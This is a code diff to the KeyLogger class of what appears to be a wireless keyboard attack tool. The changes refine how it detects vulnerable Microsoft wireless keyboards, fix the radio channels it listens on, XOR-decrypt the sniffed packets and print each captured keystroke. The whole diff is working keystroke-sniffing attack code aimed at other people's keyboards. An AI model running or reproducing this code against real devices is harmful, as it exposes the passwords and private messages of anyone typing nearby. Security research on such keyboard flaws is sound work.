@@ -27,27 +27,29 @@ class KeyLogger(object):
         self.last_sequence = 0
 
     def attack(self, address, payload):
-        if len(payload) > 9 and payload[0] == 0x0A and payload[1] == 0x78:
+        if len(payload) == 16 and payload[1] == 0x78:
             print(G + '[+] ' + W + 'Found vulnerable MS keyboard with address: %s' % self.jack.to_display(address))
-            self.hid = microsoft_enc.HID(address, payload)
+            self.hid = microsoft_enc.HID(address[::-1], payload)
+            # old MS keyboards seem to use only these channels
+            self.jack.channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]
             self.jack.sniff(self.timeout, self.jack.to_display(address), callback=self.log_keystroke)
         return
 
     def log_keystroke(self, address, payload):
         # Check if it's a keystroke packet
-        if len(payload) > 9 and payload[0] == 0x0A and payload[1] == 0x78:
+        if len(payload) == 16 and payload[1] == 0x78:
             # Check if it's a duplicate
             payload = self.hid.xor_crypt(payload)
             sequence = (payload[5] << 8) + payload[4]
 
             if sequence < self.last_sequence and (self.last_sequence - sequence) > 1000:
-                #print "sequence numbers wrapped - oseq: %d nseq: %d" % (seq, sequence)
+                #print "sequence numbers wrapped - oseq: %d nseq: %d" % (self.last_sequence, sequence)
                 self.last_sequence = sequence - 1
 
             elif sequence < self.last_sequence:
                 key = payload[9]
                 if key != self.last_key:
-                    #print "missed key? oseq: %d nseq: %d key: %s" % (seq, sequence, hid_decode(key, payload[7]))
+                    #print "missed key? oseq: %d nseq: %d key: %s" % (self.last_sequence, sequence, self.hid_decode(key, payload[7]))
                     pass
 
             if sequence > self.last_sequence:
@@ -59,8 +61,9 @@ class KeyLogger(object):
                     letter = self.hid_decode(key, payload[7])
 
                     if letter:
-                        #print "addr: %s seq: %d key: %s" % (address_string, seq, letter)
+                        #print "addr: %s seq: %d key: %s" % (self.jack.to_display(address), sequence, letter)
                         sys.stdout.write(letter)
+                        sys.stdout.flush()
 
     def hid_decode(self, key, status):
         for letter, codes in self.mapping.iteritems():
